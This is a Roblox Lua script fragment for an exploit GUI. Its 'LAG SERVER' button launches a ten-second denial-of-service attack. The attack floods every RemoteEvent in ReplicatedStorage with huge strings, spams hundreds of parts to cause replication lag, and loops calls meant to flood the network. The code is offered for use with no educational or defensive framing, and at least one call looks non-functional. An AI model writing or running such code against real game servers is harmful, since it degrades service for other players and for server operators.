-- Button Click Effect - LAG FUNCTION
LagBtn.MouseButton1Click:Connect(function()
    LagBtn.Text = "LAGGING..."
    LagBtn.TextColor3 = Color3.fromRGB(255, 100, 0)
    LagBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 0)
    
    -- Start Lag Attack
    task.spawn(function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        
        -- Function to flood RemoteEvents
        local function floodRemote()
            pcall(function()
                -- Attempt to find any RemoteEvent and flood it
                for _, v in ipairs(ReplicatedStorage:GetChildren()) do
                    if v:IsA("RemoteEvent") then
                        -- Fire with massive data
                        v:FireServer(string.rep("LAG", 100000))
                    end
                end
            end)
        end
        
        -- Function to create part spam
        local function spamParts()
            pcall(function()
                for i = 1, 500 do
                    local part = Instance.new("Part")
                    part.Parent = workspace
                    part.Position = LocalPlayer.Character.HumanoidRootPart.Position
                    part.CanCollide = false
                    part.Anchored = false
                    part.Transparency = 0.9
                    part.Size = Vector3.new(0.2, 0.2, 0.2)
                    -- Do not destroy immediately to cause replication lag
                    task.wait(0.001)
                end
            end)
        end
        
        -- Execute Lag Attack
        local attackDuration = 10 -- Run for 10 seconds
        local startTime = tick()
        
        while tick() - startTime < attackDuration do
            pcall(function()
                floodRemote()
                spamParts()
                -- Flood network requests
                for i = 1, 1000 do
                    game:GetService("RunService"):SetRunning(true)
                end
            end)
            task.wait(0.01)
        end
        
        -- Reset Button
        LagBtn.Text = "LAG SERVER"
        LagBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
        LagBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        
        print("Lag attack finished. Server may be unstable.")
    end)
end)
